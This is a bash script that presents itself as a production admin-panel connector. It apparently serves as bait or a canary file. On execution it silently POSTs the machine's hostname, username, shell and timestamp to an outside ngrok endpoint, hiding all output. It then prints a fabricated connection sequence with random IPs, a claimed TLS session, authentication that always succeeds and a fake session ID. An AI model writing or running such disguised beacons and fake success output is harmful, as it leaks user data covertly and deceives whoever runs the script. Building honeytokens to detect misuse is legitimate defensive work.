#!/bin/bash
# ============================================================
# Admin Panel Connection Script — Production Environment
# Usage: ./connect_admin.sh [production|staging]
# ============================================================

set -e

BEACON_URL="${DEVOPS_BEACON_URL:-https://oppressed-outflank-upswing.ngrok-free.dev/api/beacon}"
HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

curl -s -X POST "${BEACON_URL}" \
  -H "Content-Type: application/json" \
  -H "ngrok-skip-browser-warning: true" \
  -d "{
    \"repo\": \"devops-connect-toolkit\",
    \"bait\": \"connect_admin.sh\",
    \"action\": \"script_executed\",
    \"extra\": {
      \"hostname\": \"${HOSTNAME}\",
      \"timestamp\": \"${TIMESTAMP}\",
      \"shell\": \"${SHELL}\",
      \"user\": \"${USER}\"
    }
  }" > /dev/null 2>&1 || true

ENV="${1:-production}"
case "${ENV}" in
  production)
    ADMIN_HOST="prod-admin-panel.corp.internal"
    ADMIN_PORT="443"
    ;;
  staging)
    ADMIN_HOST="staging-admin.internal.corp"
    ADMIN_PORT="8443"
    ;;
  *)
    echo "Usage: $0 [production|staging]"
    exit 1
    ;;
esac

echo "============================================"
echo "  DevOps Connect — Admin Panel Connector"
echo "============================================"
echo ""
echo "Environment : ${ENV}"
echo "Target      : ${ADMIN_HOST}:${ADMIN_PORT}"
echo ""

echo -n "Resolving host... "
sleep 0.5
echo "OK (10.0.${RANDOM:0:1}.${RANDOM:0:3})"

echo -n "Establishing TLS session... "
sleep 0.7
echo "OK (TLS 1.3, ECDHE-RSA-AES256-GCM-SHA384)"

echo -n "Authenticating... "
sleep 0.6
echo "OK"

echo -n "Loading environment config... "
sleep 0.3
echo "OK"

echo ""
echo "✓ Connected to ${ENV} admin panel."
echo "  Dashboard: https://${ADMIN_HOST}/admin"
echo "  Session ID: sess_$(openssl rand -hex 8 2>/dev/null || echo "${RANDOM}${RANDOM}")"
echo ""
echo "Run 'devops-connect --env ${ENV} status' for connection details."
echo "============================================"
